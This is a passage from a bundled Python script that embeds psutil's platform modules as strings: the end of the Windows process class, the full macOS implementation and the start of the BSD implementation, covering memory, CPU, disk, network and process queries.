PROCESS_MEMORY_COUNTERS\n        # struct.\n        t = self._get_raw_meminfo()\n        rss = t[2]  # wset\n        vms = t[7]  # pagefile\n        return pmem(*(rss, vms, ) + t)\n\n    @wrap_exceptions\n    def memory_full_info(self):\n        basic_mem = self.memory_info()\n        uss = cext.proc_memory_uss(self.pid)\n        uss *= getpagesize()\n        return pfullmem(*basic_mem + (uss, ))\n\n    def memory_maps(self):\n        try:\n            raw = cext.proc_memory_maps(self.pid)\n        except OSError as err:\n            # XXX - can\'t use wrap_exceptions decorator as we\'re\n            # returning a generator; probably needs refactoring.\n            raise convert_oserror(err, self.pid, self._name)\n        else:\n            for addr, perm, path, rss in raw:\n                path = convert_dos_path(path)\n                if not PY3:\n                    path = py2_strencode(path)\n                addr = hex(addr)\n                yield (addr, perm, path, rss)\n\n    @wrap_exceptions\n    def kill(self):\n        return cext.proc_kill(self.pid)\n\n    @wrap_exceptions\n    def send_signal(self, sig):\n        if sig == signal.SIGTERM:\n            cext.proc_kill(self.pid)\n        # py >= 2.7\n        elif sig in (getattr(signal, "CTRL_C_EVENT", object()),\n                     getattr(signal, "CTRL_BREAK_EVENT", object())):\n            os.kill(self.pid, sig)\n        else:\n            raise ValueError(\n                "only SIGTERM, CTRL_C_EVENT and CTRL_BREAK_EVENT signals "\n                "are supported on Windows")\n\n    @wrap_exceptions\n    def wait(self, timeout=None):\n        if timeout is None:\n            cext_timeout = cext.INFINITE\n        else:\n            # WaitForSingleObject() expects time in milliseconds.\n            cext_timeout = int(timeout * 1000)\n\n        timer = getattr(time, \'monotonic\', time.time)\n        stop_at = timer() + timeout if timeout is not None else None\n\n        try:\n            # Exit code is supposed to come from GetExitCodeProcess().\n            # May also be None if OpenProcess() failed with\n            # ERROR_INVALID_PARAMETER, meaning PID is already gone.\n            exit_code = cext.proc_wait(self.pid, cext_timeout)\n        except cext.TimeoutExpired:\n            # WaitForSingleObject() returned WAIT_TIMEOUT. Just raise.\n            raise TimeoutExpired(timeout, self.pid, self._name)\n        except cext.TimeoutAbandoned:\n            # WaitForSingleObject() returned WAIT_ABANDONED, see:\n            # https://github.com/giampaolo/psutil/issues/1224\n            # We\'ll just rely on the internal polling and return None\n            # when the PID disappears. Subprocess module does the same\n            # (return None):\n            # https://github.com/python/cpython/blob/\n            #     be50a7b627d0aa37e08fa8e2d5568891f19903ce/\n            #     Lib/subprocess.py#L1193-L1194\n            exit_code = None\n\n        # At this point WaitForSingleObject() returned WAIT_OBJECT_0,\n        # meaning the process is gone. Stupidly there are cases where\n        # its PID may still stick around so we do a further internal\n        # polling.\n        delay = 0.0001\n        while True:\n            if not pid_exists(self.pid):\n                return exit_code\n            if stop_at and timer() >= stop_at:\n                raise TimeoutExpired(timeout, pid=self.pid, name=self._name)\n            time.sleep(delay)\n            delay = min(delay * 2, 0.04)  # incremental delay\n\n    @wrap_exceptions\n    def username(self):\n        if self.pid in (0, 4):\n            return \'NT AUTHORITY\\\\SYSTEM\'\n        domain, user = cext.proc_username(self.pid)\n        return py2_strencode(domain) + \'\\\\\' + py2_strencode(user)\n\n    @wrap_exceptions\n    def create_time(self):\n        # Note: proc_times() not put under oneshot() \'cause create_time()\n        # is already cached by the main Process class.\n        try:\n            user, system, created = cext.proc_times(self.pid)\n            return created\n        except OSError as err:\n            if is_permission_err(err):\n                return self._proc_info()[pinfo_map[\'create_time\']]\n            raise\n\n    @wrap_exceptions\n    def num_threads(self):\n        return self._proc_info()[pinfo_map[\'num_threads\']]\n\n    @wrap_exceptions\n    def threads(self):\n        rawlist = cext.proc_threads(self.pid)\n        retlist = []\n        for thread_id, utime, stime in rawlist:\n            ntuple = _common.pthread(thread_id, utime, stime)\n            retlist.append(ntuple)\n        return retlist\n\n    @wrap_exceptions\n    def cpu_times(self):\n        try:\n            user, system, created = cext.proc_times(self.pid)\n        except OSError as err:\n            if not is_permission_err(err):\n                raise\n            info = self._proc_info()\n            user = info[pinfo_map[\'user_time\']]\n            system = info[pinfo_map[\'kernel_time\']]\n        # Children user/system times are not retrievable (set to 0).\n        return _common.pcputimes(user, system, 0.0, 0.0)\n\n    @wrap_exceptions\n    def suspend(self):\n        cext.proc_suspend_or_resume(self.pid, True)\n\n    @wrap_exceptions\n    def resume(self):\n        cext.proc_suspend_or_resume(self.pid, False)\n\n    @wrap_exceptions\n    @retry_error_partial_copy\n    def cwd(self):\n        if self.pid in (0, 4):\n            raise AccessDenied(self.pid, self._name)\n        # return a normalized pathname since the native C function appends\n        # "\\\\" at the and of the path\n        path = cext.proc_cwd(self.pid)\n        return py2_strencode(os.path.normpath(path))\n\n    @wrap_exceptions\n    def open_files(self):\n        if self.pid in (0, 4):\n            return []\n        ret = set()\n        # Filenames come in in native format like:\n        # "\\Device\\HarddiskVolume1\\Windows\\systemew\\file.txt"\n        # Convert the first part in the corresponding drive letter\n        # (e.g. "C:\\") by using Windows\'s QueryDosDevice()\n        raw_file_names = cext.proc_open_files(self.pid)\n        for _file in raw_file_names:\n            _file = convert_dos_path(_file)\n            if isfile_strict(_file):\n                if not PY3:\n                    _file = py2_strencode(_file)\n                ntuple = _common.popenfile(_file, -1)\n                ret.add(ntuple)\n        return list(ret)\n\n    @wrap_exceptions\n    def connections(self, kind=\'inet\'):\n        return net_connections(kind, _pid=self.pid)\n\n    @wrap_exceptions\n    def nice_get(self):\n        value = cext.proc_priority_get(self.pid)\n        if enum is not None:\n            value = Priority(value)\n        return value\n\n    @wrap_exceptions\n    def nice_set(self, value):\n        return cext.proc_priority_set(self.pid, value)\n\n    @wrap_exceptions\n    def ionice_get(self):\n        ret = cext.proc_io_priority_get(self.pid)\n        if enum is not None:\n            ret = IOPriority(ret)\n        return ret\n\n    @wrap_exceptions\n    def ionice_set(self, ioclass, value):\n        if value:\n            raise TypeError("value argument not accepted on Windows")\n        if ioclass not in (IOPRIO_VERYLOW, IOPRIO_LOW, IOPRIO_NORMAL,\n                           IOPRIO_HIGH):\n            raise ValueError("%s is not a valid priority" % ioclass)\n        cext.proc_io_priority_set(self.pid, ioclass)\n\n    @wrap_exceptions\n    def io_counters(self):\n        try:\n            ret = cext.proc_io_counters(self.pid)\n        except OSError as err:\n            if not is_permission_err(err):\n                raise\n            info = self._proc_info()\n            ret = (\n                info[pinfo_map[\'io_rcount\']],\n                info[pinfo_map[\'io_wcount\']],\n                info[pinfo_map[\'io_rbytes\']],\n                info[pinfo_map[\'io_wbytes\']],\n                info[pinfo_map[\'io_count_others\']],\n                info[pinfo_map[\'io_bytes_others\']],\n            )\n        return pio(*ret)\n\n    @wrap_exceptions\n    def status(self):\n        suspended = cext.proc_is_suspended(self.pid)\n        if suspended:\n            return _common.STATUS_STOPPED\n        else:\n            return _common.STATUS_RUNNING\n\n    @wrap_exceptions\n    def cpu_affinity_get(self):\n        def from_bitmask(x):\n            return [i for i in range(64) if (1 << i) & x]\n        bitmask = cext.proc_cpu_affinity_get(self.pid)\n        return from_bitmask(bitmask)\n\n    @wrap_exceptions\n    def cpu_affinity_set(self, value):\n        def to_bitmask(ls):\n            if not ls:\n                raise ValueError("invalid argument %r" % ls)\n            out = 0\n            for b in ls:\n                out |= 2 ** b\n            return out\n\n        # SetProcessAffinityMask() states that ERROR_INVALID_PARAMETER\n        # is returned for an invalid CPU but this seems not to be true,\n        # therefore we check CPUs validy beforehand.\n        allcpus = list(range(len(per_cpu_times())))\n        for cpu in value:\n            if cpu not in allcpus:\n                if not isinstance(cpu, (int, long)):\n                    raise TypeError(\n                        "invalid CPU %r; an integer is required" % cpu)\n                else:\n                    raise ValueError("invalid CPU %r" % cpu)\n\n        bitmask = to_bitmask(value)\n        cext.proc_cpu_affinity_set(self.pid, bitmask)\n\n    @wrap_exceptions\n    def num_handles(self):\n        try:\n            return cext.proc_num_handles(self.pid)\n        except OSError as err:\n            if is_permission_err(err):\n                return self._proc_info()[pinfo_map[\'num_handles\']]\n            raise\n\n    @wrap_exceptions\n    def num_ctx_switches(self):\n        ctx_switches = self._proc_info()[pinfo_map[\'ctx_switches\']]\n        # only voluntary ctx switches are supported\n        return _common.pctxsw(ctx_switches, 0)\n')
    __stickytape_write_module('psutil/_psosx.py', b'# Copyright (c) 2009, Giampaolo Rodola\'. All rights reserved.\n# Use of this source code is governed by a BSD-style license that can be\n# found in the LICENSE file.\n\n"""macOS platform implementation."""\n\nimport errno\nimport functools\nimport os\nfrom collections import namedtuple\n\nfrom . import _common\nfrom . import _psposix\nfrom . import _psutil_osx as cext\nfrom . import _psutil_posix as cext_posix\nfrom ._common import AccessDenied\nfrom ._common import NoSuchProcess\nfrom ._common import ZombieProcess\nfrom ._common import conn_tmap\nfrom ._common import conn_to_ntuple\nfrom ._common import isfile_strict\nfrom ._common import memoize_when_activated\nfrom ._common import parse_environ_block\nfrom ._common import usage_percent\nfrom ._compat import PermissionError\nfrom ._compat import ProcessLookupError\n\n\n__extra__all__ = []\n\n\n# =====================================================================\n# --- globals\n# =====================================================================\n\n\nPAGESIZE = cext_posix.getpagesize()\nAF_LINK = cext_posix.AF_LINK\n\nTCP_STATUSES = {\n    cext.TCPS_ESTABLISHED: _common.CONN_ESTABLISHED,\n    cext.TCPS_SYN_SENT: _common.CONN_SYN_SENT,\n    cext.TCPS_SYN_RECEIVED: _common.CONN_SYN_RECV,\n    cext.TCPS_FIN_WAIT_1: _common.CONN_FIN_WAIT1,\n    cext.TCPS_FIN_WAIT_2: _common.CONN_FIN_WAIT2,\n    cext.TCPS_TIME_WAIT: _common.CONN_TIME_WAIT,\n    cext.TCPS_CLOSED: _common.CONN_CLOSE,\n    cext.TCPS_CLOSE_WAIT: _common.CONN_CLOSE_WAIT,\n    cext.TCPS_LAST_ACK: _common.CONN_LAST_ACK,\n    cext.TCPS_LISTEN: _common.CONN_LISTEN,\n    cext.TCPS_CLOSING: _common.CONN_CLOSING,\n    cext.PSUTIL_CONN_NONE: _common.CONN_NONE,\n}\n\nPROC_STATUSES = {\n    cext.SIDL: _common.STATUS_IDLE,\n    cext.SRUN: _common.STATUS_RUNNING,\n    cext.SSLEEP: _common.STATUS_SLEEPING,\n    cext.SSTOP: _common.STATUS_STOPPED,\n    cext.SZOMB: _common.STATUS_ZOMBIE,\n}\n\nkinfo_proc_map = dict(\n    ppid=0,\n    ruid=1,\n    euid=2,\n    suid=3,\n    rgid=4,\n    egid=5,\n    sgid=6,\n    ttynr=7,\n    ctime=8,\n    status=9,\n    name=10,\n)\n\npidtaskinfo_map = dict(\n    cpuutime=0,\n    cpustime=1,\n    rss=2,\n    vms=3,\n    pfaults=4,\n    pageins=5,\n    numthreads=6,\n    volctxsw=7,\n)\n\n\n# =====================================================================\n# --- named tuples\n# =====================================================================\n\n\n# psutil.cpu_times()\nscputimes = namedtuple(\'scputimes\', [\'user\', \'nice\', \'system\', \'idle\'])\n# psutil.virtual_memory()\nsvmem = namedtuple(\n    \'svmem\', [\'total\', \'available\', \'percent\', \'used\', \'free\',\n              \'active\', \'inactive\', \'wired\'])\n# psutil.Process.memory_info()\npmem = namedtuple(\'pmem\', [\'rss\', \'vms\', \'pfaults\', \'pageins\'])\n# psutil.Process.memory_full_info()\npfullmem = namedtuple(\'pfullmem\', pmem._fields + (\'uss\', ))\n\n\n# =====================================================================\n# --- memory\n# =====================================================================\n\n\ndef virtual_memory():\n    """System virtual memory as a namedtuple."""\n    total, active, inactive, wired, free, speculative = cext.virtual_mem()\n    # This is how Zabbix calculate avail and used mem:\n    # https://github.com/zabbix/zabbix/blob/trunk/src/libs/zbxsysinfo/\n    #     osx/memory.c\n    # Also see: https://github.com/giampaolo/psutil/issues/1277\n    avail = inactive + free\n    used = active + wired\n    # This is NOT how Zabbix calculates free mem but it matches "free"\n    # cmdline utility.\n    free -= speculative\n    percent = usage_percent((total - avail), total, round_=1)\n    return svmem(total, avail, percent, used, free,\n                 active, inactive, wired)\n\n\ndef swap_memory():\n    """Swap system memory as a (total, used, free, sin, sout) tuple."""\n    total, used, free, sin, sout = cext.swap_mem()\n    percent = usage_percent(used, total, round_=1)\n    return _common.sswap(total, used, free, percent, sin, sout)\n\n\n# =====================================================================\n# --- CPU\n# =====================================================================\n\n\ndef cpu_times():\n    """Return system CPU times as a namedtuple."""\n    user, nice, system, idle = cext.cpu_times()\n    return scputimes(user, nice, system, idle)\n\n\ndef per_cpu_times():\n    """Return system CPU times as a named tuple"""\n    ret = []\n    for cpu_t in cext.per_cpu_times():\n        user, nice, system, idle = cpu_t\n        item = scputimes(user, nice, system, idle)\n        ret.append(item)\n    return ret\n\n\ndef cpu_count_logical():\n    """Return the number of logical CPUs in the system."""\n    return cext.cpu_count_logical()\n\n\ndef cpu_count_cores():\n    """Return the number of CPU cores in the system."""\n    return cext.cpu_count_cores()\n\n\ndef cpu_stats():\n    ctx_switches, interrupts, soft_interrupts, syscalls, traps = \\\n        cext.cpu_stats()\n    return _common.scpustats(\n        ctx_switches, interrupts, soft_interrupts, syscalls)\n\n\ndef cpu_freq():\n    """Return CPU frequency.\n    On macOS per-cpu frequency is not supported.\n    Also, the returned frequency never changes, see:\n    https://arstechnica.com/civis/viewtopic.php?f=19&t=465002\n    """\n    curr, min_, max_ = cext.cpu_freq()\n    return [_common.scpufreq(curr, min_, max_)]\n\n\n# =====================================================================\n# --- disks\n# =====================================================================\n\n\ndisk_usage = _psposix.disk_usage\ndisk_io_counters = cext.disk_io_counters\n\n\ndef disk_partitions(all=False):\n    """Return mounted disk partitions as a list of namedtuples."""\n    retlist = []\n    partitions = cext.disk_partitions()\n    for partition in partitions:\n        device, mountpoint, fstype, opts = partition\n        if device == \'none\':\n            device = \'\'\n        if not all:\n            if not os.path.isabs(device) or not os.path.exists(device):\n                continue\n        maxfile = maxpath = None  # set later\n        ntuple = _common.sdiskpart(device, mountpoint, fstype, opts,\n                                   maxfile, maxpath)\n        retlist.append(ntuple)\n    return retlist\n\n\n# =====================================================================\n# --- sensors\n# =====================================================================\n\n\ndef sensors_battery():\n    """Return battery information."""\n    try:\n        percent, minsleft, power_plugged = cext.sensors_battery()\n    except NotImplementedError:\n        # no power source - return None according to interface\n        return None\n    power_plugged = power_plugged == 1\n    if power_plugged:\n        secsleft = _common.POWER_TIME_UNLIMITED\n    elif minsleft == -1:\n        secsleft = _common.POWER_TIME_UNKNOWN\n    else:\n        secsleft = minsleft * 60\n    return _common.sbattery(percent, secsleft, power_plugged)\n\n\n# =====================================================================\n# --- network\n# =====================================================================\n\n\nnet_io_counters = cext.net_io_counters\nnet_if_addrs = cext_posix.net_if_addrs\n\n\ndef net_connections(kind=\'inet\'):\n    """System-wide network connections."""\n    # Note: on macOS this will fail with AccessDenied unless\n    # the process is owned by root.\n    ret = []\n    for pid in pids():\n        try:\n            cons = Process(pid).connections(kind)\n        except NoSuchProcess:\n            continue\n        else:\n            if cons:\n                for c in cons:\n                    c = list(c) + [pid]\n                    ret.append(_common.sconn(*c))\n    return ret\n\n\ndef net_if_stats():\n    """Get NIC stats (isup, duplex, speed, mtu)."""\n    names = net_io_counters().keys()\n    ret = {}\n    for name in names:\n        try:\n            mtu = cext_posix.net_if_mtu(name)\n            isup = cext_posix.net_if_is_running(name)\n            duplex, speed = cext_posix.net_if_duplex_speed(name)\n        except OSError as err:\n            # https://github.com/giampaolo/psutil/issues/1279\n            if err.errno != errno.ENODEV:\n                raise\n        else:\n            if hasattr(_common, \'NicDuplex\'):\n                duplex = _common.NicDuplex(duplex)\n            ret[name] = _common.snicstats(isup, duplex, speed, mtu)\n    return ret\n\n\n# =====================================================================\n# --- other system functions\n# =====================================================================\n\n\ndef boot_time():\n    """The system boot time expressed in seconds since the epoch."""\n    return cext.boot_time()\n\n\ndef users():\n    """Return currently connected users as a list of namedtuples."""\n    retlist = []\n    rawlist = cext.users()\n    for item in rawlist:\n        user, tty, hostname, tstamp, pid = item\n        if tty == \'~\':\n            continue  # reboot or shutdown\n        if not tstamp:\n            continue\n        nt = _common.suser(user, tty or None, hostname or None, tstamp, pid)\n        retlist.append(nt)\n    return retlist\n\n\n# =====================================================================\n# --- processes\n# =====================================================================\n\n\ndef pids():\n    ls = cext.pids()\n    if 0 not in ls:\n        # On certain macOS versions pids() C doesn\'t return PID 0 but\n        # "ps" does and the process is querable via sysctl():\n        # https://travis-ci.org/giampaolo/psutil/jobs/309619941\n        try:\n            Process(0).create_time()\n            ls.insert(0, 0)\n        except NoSuchProcess:\n            pass\n        except AccessDenied:\n            ls.insert(0, 0)\n    return ls\n\n\npid_exists = _psposix.pid_exists\n\n\ndef is_zombie(pid):\n    try:\n        st = cext.proc_kinfo_oneshot(pid)[kinfo_proc_map[\'status\']]\n        return st == cext.SZOMB\n    except Exception:\n        return False\n\n\ndef wrap_exceptions(fun):\n    """Decorator which translates bare OSError exceptions into\n    NoSuchProcess and AccessDenied.\n    """\n    @functools.wraps(fun)\n    def wrapper(self, *args, **kwargs):\n        try:\n            return fun(self, *args, **kwargs)\n        except ProcessLookupError:\n            if is_zombie(self.pid):\n                raise ZombieProcess(self.pid, self._name, self._ppid)\n            else:\n                raise NoSuchProcess(self.pid, self._name)\n        except PermissionError:\n            raise AccessDenied(self.pid, self._name)\n        except cext.ZombieProcessError:\n            raise ZombieProcess(self.pid, self._name, self._ppid)\n    return wrapper\n\n\nclass Process(object):\n    """Wrapper class around underlying C implementation."""\n\n    __slots__ = ["pid", "_name", "_ppid", "_cache"]\n\n    def __init__(self, pid):\n        self.pid = pid\n        self._name = None\n        self._ppid = None\n\n    @wrap_exceptions\n    @memoize_when_activated\n    def _get_kinfo_proc(self):\n        # Note: should work with all PIDs without permission issues.\n        ret = cext.proc_kinfo_oneshot(self.pid)\n        assert len(ret) == len(kinfo_proc_map)\n        return ret\n\n    @wrap_exceptions\n    @memoize_when_activated\n    def _get_pidtaskinfo(self):\n        # Note: should work for PIDs owned by user only.\n        ret = cext.proc_pidtaskinfo_oneshot(self.pid)\n        assert len(ret) == len(pidtaskinfo_map)\n        return ret\n\n    def oneshot_enter(self):\n        self._get_kinfo_proc.cache_activate(self)\n        self._get_pidtaskinfo.cache_activate(self)\n\n    def oneshot_exit(self):\n        self._get_kinfo_proc.cache_deactivate(self)\n        self._get_pidtaskinfo.cache_deactivate(self)\n\n    @wrap_exceptions\n    def name(self):\n        name = self._get_kinfo_proc()[kinfo_proc_map[\'name\']]\n        return name if name is not None else cext.proc_name(self.pid)\n\n    @wrap_exceptions\n    def exe(self):\n        return cext.proc_exe(self.pid)\n\n    @wrap_exceptions\n    def cmdline(self):\n        return cext.proc_cmdline(self.pid)\n\n    @wrap_exceptions\n    def environ(self):\n        return parse_environ_block(cext.proc_environ(self.pid))\n\n    @wrap_exceptions\n    def ppid(self):\n        self._ppid = self._get_kinfo_proc()[kinfo_proc_map[\'ppid\']]\n        return self._ppid\n\n    @wrap_exceptions\n    def cwd(self):\n        return cext.proc_cwd(self.pid)\n\n    @wrap_exceptions\n    def uids(self):\n        rawtuple = self._get_kinfo_proc()\n        return _common.puids(\n            rawtuple[kinfo_proc_map[\'ruid\']],\n            rawtuple[kinfo_proc_map[\'euid\']],\n            rawtuple[kinfo_proc_map[\'suid\']])\n\n    @wrap_exceptions\n    def gids(self):\n        rawtuple = self._get_kinfo_proc()\n        return _common.puids(\n            rawtuple[kinfo_proc_map[\'rgid\']],\n            rawtuple[kinfo_proc_map[\'egid\']],\n            rawtuple[kinfo_proc_map[\'sgid\']])\n\n    @wrap_exceptions\n    def terminal(self):\n        tty_nr = self._get_kinfo_proc()[kinfo_proc_map[\'ttynr\']]\n        tmap = _psposix.get_terminal_map()\n        try:\n            return tmap[tty_nr]\n        except KeyError:\n            return None\n\n    @wrap_exceptions\n    def memory_info(self):\n        rawtuple = self._get_pidtaskinfo()\n        return pmem(\n            rawtuple[pidtaskinfo_map[\'rss\']],\n            rawtuple[pidtaskinfo_map[\'vms\']],\n            rawtuple[pidtaskinfo_map[\'pfaults\']],\n            rawtuple[pidtaskinfo_map[\'pageins\']],\n        )\n\n    @wrap_exceptions\n    def memory_full_info(self):\n        basic_mem = self.memory_info()\n        uss = cext.proc_memory_uss(self.pid)\n        return pfullmem(*basic_mem + (uss, ))\n\n    @wrap_exceptions\n    def cpu_times(self):\n        rawtuple = self._get_pidtaskinfo()\n        return _common.pcputimes(\n            rawtuple[pidtaskinfo_map[\'cpuutime\']],\n            rawtuple[pidtaskinfo_map[\'cpustime\']],\n            # children user / system times are not retrievable (set to 0)\n            0.0, 0.0)\n\n    @wrap_exceptions\n    def create_time(self):\n        return self._get_kinfo_proc()[kinfo_proc_map[\'ctime\']]\n\n    @wrap_exceptions\n    def num_ctx_switches(self):\n        # Unvoluntary value seems not to be available;\n        # getrusage() numbers seems to confirm this theory.\n        # We set it to 0.\n        vol = self._get_pidtaskinfo()[pidtaskinfo_map[\'volctxsw\']]\n        return _common.pctxsw(vol, 0)\n\n    @wrap_exceptions\n    def num_threads(self):\n        return self._get_pidtaskinfo()[pidtaskinfo_map[\'numthreads\']]\n\n    @wrap_exceptions\n    def open_files(self):\n        if self.pid == 0:\n            return []\n        files = []\n        rawlist = cext.proc_open_files(self.pid)\n        for path, fd in rawlist:\n            if isfile_strict(path):\n                ntuple = _common.popenfile(path, fd)\n                files.append(ntuple)\n        return files\n\n    @wrap_exceptions\n    def connections(self, kind=\'inet\'):\n        if kind not in conn_tmap:\n            raise ValueError("invalid %r kind argument; choose between %s"\n                             % (kind, \', \'.join([repr(x) for x in conn_tmap])))\n        families, types = conn_tmap[kind]\n        rawlist = cext.proc_connections(self.pid, families, types)\n        ret = []\n        for item in rawlist:\n            fd, fam, type, laddr, raddr, status = item\n            nt = conn_to_ntuple(fd, fam, type, laddr, raddr, status,\n                                TCP_STATUSES)\n            ret.append(nt)\n        return ret\n\n    @wrap_exceptions\n    def num_fds(self):\n        if self.pid == 0:\n            return 0\n        return cext.proc_num_fds(self.pid)\n\n    @wrap_exceptions\n    def wait(self, timeout=None):\n        return _psposix.wait_pid(self.pid, timeout, self._name)\n\n    @wrap_exceptions\n    def nice_get(self):\n        return cext_posix.getpriority(self.pid)\n\n    @wrap_exceptions\n    def nice_set(self, value):\n        return cext_posix.setpriority(self.pid, value)\n\n    @wrap_exceptions\n    def status(self):\n        code = self._get_kinfo_proc()[kinfo_proc_map[\'status\']]\n        # XXX is \'?\' legit? (we\'re not supposed to return it anyway)\n        return PROC_STATUSES.get(code, \'?\')\n\n    @wrap_exceptions\n    def threads(self):\n        rawlist = cext.proc_threads(self.pid)\n        retlist = []\n        for thread_id, utime, stime in rawlist:\n            ntuple = _common.pthread(thread_id, utime, stime)\n            retlist.append(ntuple)\n        return retlist\n')
    __stickytape_write_module('psutil/_psbsd.py', b'# Copyright (c) 2009, Giampaolo Rodola\'. All rights reserved.\n# Use of this source code is governed by a BSD-style license that can be\n# found in the LICENSE file.\n\n"""FreeBSD, OpenBSD and NetBSD platforms implementation."""\n\nimport contextlib\nimport errno\nimport functools\nimport os\nimport xml.etree.ElementTree as ET\nfrom collections import defaultdict\nfrom collections import namedtuple\n\nfrom . import _common\nfrom . import _psposix\nfrom . import _psutil_bsd as cext\nfrom . import _psutil_posix as cext_posix\nfrom ._common import FREEBSD\nfrom ._common import NETBSD\nfrom ._common import OPENBSD\nfrom ._common import AccessDenied\nfrom ._common import NoSuchProcess\nfrom ._common import ZombieProcess\nfrom ._common import conn_tmap\nfrom ._common import conn_to_ntuple\nfrom ._common import memoize\nfrom ._common import memoize_when_activated\nfrom ._common import usage_percent\nfrom ._compat import FileNotFoundError\nfrom ._compat import PermissionError\nfrom ._compat import ProcessLookupError\nfrom ._compat import which\n\n\n__extra__all__ = []\n\n\n# =====================================================================\n# --- globals\n# =====================================================================\n\n\nif FREEBSD:\n    PROC_STATUSES = {\n        cext.SIDL: _common.STATUS_IDLE,\n        cext.SRUN: _common.STATUS_RUNNING,\n        cext.SSLEEP: _common.STATUS_SLEEPING,\n        cext.SSTOP: _common.STATUS_STOPPED,\n        cext.SZOMB: _common.STATUS_ZOMBIE,\n        cext.SWAIT: _common.STATUS_WAITING,\n        cext.SLOCK: _common.STATUS_LOCKED,\n    }\nelif OPENBSD:\n    PROC_STATUSES = {\n        cext.SIDL: _common.STATUS_IDLE,\n        cext.SSLEEP: _common.STATUS_SLEEPING,\n        cext.SSTOP: _common.STATUS_STOPPED,\n        # According to /usr/include/sys/proc.h SZOMB is unused.\n        # test_zombie_process() shows that SDEAD is the right\n        # equivalent. Also it appears there\'s no equivalent of\n        # psutil.STATUS_DEAD. SDEAD really means STATUS_ZOMBIE.\n        # cext.SZOMB: _common.STATUS_ZOMBIE,\n        cext.SDEAD: _common.STATUS_ZOMBIE,\n        cext.SZOMB: _common.STATUS_ZOMBIE,\n        # From http://www.eecs.harvard.edu/~margo/cs161/videos/proc.h.txt\n        # OpenBSD has SRUN and SONPROC: SRUN indicates that a process\n        # is runnable but *not* yet running, i.e. is on a run queue.\n        # SONPROC indicates that the process is actually executing on\n        # a CPU, i.e. it is no longer on a run queue.\n        # As such we\'ll map SRUN to STATUS_WAKING and SONPROC to\n        # STATUS_RUNNING\n        cext.SRUN: _common.STATUS_WAKING,\n        cext.SONPROC: _common.STATUS_RUNNING,\n    }\nelif NETBSD:\n    PROC_STATUSES = {\n        cext.SIDL: _common.STATUS_IDLE,\n        cext.SSLEEP: _common.STATUS_SLEEPING,\n        cext.SSTOP: _common.STATUS_STOPPED,\n        cext.SZOMB: _common.STATUS_ZOMBIE,\n        cext.SRUN: _common.STATUS_WAKING,\n        cext.SONPROC: _common.STATUS_RUNNING,\n    }\n\nTCP_STATUSES = {\n    cext.TCPS_ESTABLISHED: _common.CONN_ESTABLISHED,\n    cext.TCPS_SYN_SENT: _common.CONN_SYN_SENT,\n    cext.TCPS_SYN_RECEIVED: _common.CONN_SYN_RECV,\n    cext.TCPS_FIN_WAIT_1: _common.CONN_FIN_WAIT1,\n    cext.TCPS_FIN_WAIT_2: _common.CONN_FIN_WAIT2,\n    cext.TCPS_TIME_WAIT: _common.CONN_TIME_WAIT,\n    cext.TCPS_CLOSED: _common.CONN_CLOSE,\n    cext.TCPS_CLOSE_WAIT: _common.CONN_CLOSE_WAIT,\n    cext.TCPS_LAST_ACK: _common.CONN_LAST_ACK,\n    cext.TCPS_LISTEN: _common.CONN_LISTEN,\n    cext.TCPS_CLOSING: _common.CONN_CLOSING,\n    cext.PSUTIL_CONN_NONE: _common.CONN_NONE,\n}\n\nPAGESIZE = cext_posix.getpagesize()\nAF_LINK = cext_posix.AF_LINK\n\nHAS_PER_CPU_TIMES = hasattr(cext, "per_cpu_times")\nHAS_PROC_NUM_THREADS = hasattr(cext, "proc_num_threads")\nHAS_PROC_OPEN_FILES = hasattr(cext, \'proc_open_files\')\nHAS_PROC_NUM_FDS = hasattr(cext, \'proc_num_fds\')\n\nkinfo_proc_map = dict(\n    ppid=0,\n    status=1,\n    real_uid=2,\n    effective_uid=3,\n    saved_uid=4,\n    real_gid=5,\n    effective_gid=6,\n    saved_gid=7,\n    ttynr=8,\n    create_time=9,\n    ctx_switches_vol=10,\n    ctx_switches_unvol=11,\n    read_io_count=12,\n    write_io_count=13,\n    user_time=14,\n    sys_time=15,\n    ch_user_time=16,\n    ch_sys_time=17,\n    rss=18,\n    vms=19,\n    memtext=20,\n    memdata=21,\n    memstack=22,\n    cpunum=23,\n    name=24,\n)\n\n\n# =====================================================================\n# --- named tuples\n# =====================================================================\n\n\n# psutil.virtual_memory()\nsvmem = namedtuple(\n    \'svmem\', [\'total\', \'available\', \'percent\', \'used\', \'free\',\n              \'active\', \'inactive\', \'buffers\', \'cached\', \'shared\', \'wired\'])\n# psutil.cpu_times()\nscputimes = namedtuple(\n    \'scputimes\', [\'user\', \'nice\', \'system\', \'idle\', \'irq\'])\n# psutil.Process.memory_info()\npmem = namedtuple(\'pmem\', [\'rss\', \'vms\', \'text\', \'data\', \'stack\'])\n# psutil.Process.memory_full_info()\npfullmem = pmem\n# psutil.Process.cpu_times()\npcputimes = namedtuple(\'pcputimes\',\n                       [\'user\', \'system\', \'children_user\', \'children_system\'])\n# psutil.Process.memory_maps(grouped=True)\npmmap_grouped = namedtuple(\n    \'pmmap_grouped\', \'path rss, private, ref_count, shadow_count\')\n# psutil.Process.memory_maps(grouped=False)\npmmap_ext = namedtuple(\n    \'pmmap_ext\', \'addr, perms path rss, private, ref_count, shadow_count\')\n# psutil.disk_io_counters()\nif FREEBSD:\n    sdiskio = namedtuple(\'sdiskio\', [\'read_count\', \'write_count\',\n                                     \'read_bytes\', \'write_bytes\',\n                                     \'read_time\', \'write_time\',\n                                     \'busy_time\'])\nelse:\n    sdiskio = namedtuple(\'sdiskio\', [\'read_count\', \'write_count\',\n                                     \'read_bytes\', \'write_bytes\'])\n\n\n# =====================================================================\n# --- memory\n# =====================================================================\n\n\ndef virtual_memory():\n    """System virtual memory as a namedtuple."""\n    mem = cext.virtual_mem()\n    total, free, active, inactive, wired, cached, buffers, shared = mem\n    if NETBSD:\n        # On NetBSD buffers and shared mem is determined via /proc.\n        # The C ext set them to 0.\n        with open(\'/proc/meminfo\', \'rb\') as f:\n            for line in f:\n                if line.startswith(b\'Buffers:\'):\n                    buffers = int(line.split()[1]) * 1024\n                elif line.startswith(b\'MemShared:\'):\n                    shared = int(line.split()[1]) * 1024\n    avail = inactive + cached + free\n    used = active + wired + cached\n    percent = usage_percent((total - avail), total, round_=1)\n    return svmem(total, avail, percent, used, free,\n                 active, inactive, buffers, cached, shared, wired)\n\n\ndef swap_memory():\n    """System swap memory as (total, used, free, sin, sout) namedtuple."""\n    total, used, free, sin, sout = cext.swap_mem()\n    percent = usage_percent(used, total, round_=1)\n    return _common.sswap(total, used, free, percent, sin, sout)\n\n\n# =====================================================================\n# --- CPU\n# =====================================================================\n\n\ndef cpu_times():\n    